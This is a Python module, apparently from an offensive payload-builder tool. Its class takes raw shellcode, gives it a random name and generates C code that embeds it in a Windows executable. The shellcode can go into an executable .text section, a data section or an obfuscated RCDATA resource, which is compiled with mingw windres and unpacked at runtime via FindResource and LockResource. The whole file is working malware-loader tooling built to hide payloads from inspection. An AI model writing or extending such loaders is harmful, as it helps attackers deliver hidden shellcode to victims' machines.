import random
import string
from c.utils.formatters import *
import subprocess

class embedded:

    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        self.type = type(shellcode).__name__
        self.section = 'rdata'
        if 'section' in arguments:
            if arguments['section'] not in ['data', 'rdata', 'text', 'rsrc']:
                print('Section must be either data, rdata, or text')
                exit(0)
            self.section = arguments['section']
        self.shellcode = globals()[f'{type(shellcode).__name__}_to_c'](shellcode, self.name, self.section != 'data')
        if self.section == 'rsrc':
            if self.type == 'list':
                self.datatype = 'const unsigned char **'
                self.len = len(shellcode)
                open('/tmp/resource.bin', 'w').write('\n'.join(shellcode))
            elif self.type == 'str':
                self.datatype = 'const unsigned char *'
                open('/tmp/resource.bin', 'w').write(shellcode)
            elif self.type == 'bytes':
                self.datatype = 'const unsigned char *'
                open('/tmp/resource.bin', 'wb').write(shellcode)
            open('/tmp/resource.rc', 'w').write('SHELLCODE RCDATA "/tmp/resource.bin"')
            subprocess.run(['x86_64-w64-mingw32-windres','/tmp/resource.rc','-o','/tmp/resource.o'])

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        if self.section == 'rsrc':
            return ['/tmp/resource.o']
        return []

    def transformer(self, shellcodestring: str) -> str:
        if self.section == 'rsrc':
            return shellcodestring.format(shellcode=f'(const {self.datatype}){self.name}()')
        if self.type == 'list':
            return shellcodestring.format(shellcode=f'(const unsigned char **){self.name}')
        elif self.type == 'bytes':
            return shellcodestring.format(shellcode=f'(unsigned char *){self.name}')
        return shellcodestring.format(shellcode=self.name)

    def codeblock(self) -> str:
        if self.section == 'text':
            return f"""
#pragma section(".text${self.name}", read, execute)
__attribute__((section(".text${self.name}"))) {self.shellcode}
"""
        elif self.section == 'rsrc':
            codeblock = f"""
{self.datatype} {self.name}(){{

    HRSRC hRes = FindResource(NULL, "SHELLCODE", RT_RCDATA);
    HGLOBAL hData = LoadResource(NULL, hRes);
    unsigned char* obfuscated = (unsigned char*)LockResource(hData);
    DWORD arraySize = SizeofResource(NULL, hRes);
"""
            if self.type == 'list':
                codeblock += f"""

    const unsigned char **obfuscatedList = malloc(sizeof(unsigned char *) * {self.len});
    char* token = strtok(obfuscated, "\\n");
    for (int i = 0; i< {self.len}; i++){{
        obfuscatedList[i] = strdup(token);
        token = strtok(NULL, "\\n");
    }}
    return obfuscatedList;
}}
"""
            else: 
                codeblock += """
    return obfuscated;
}}
"""
            return codeblock

        return f"""
{self.shellcode}
"""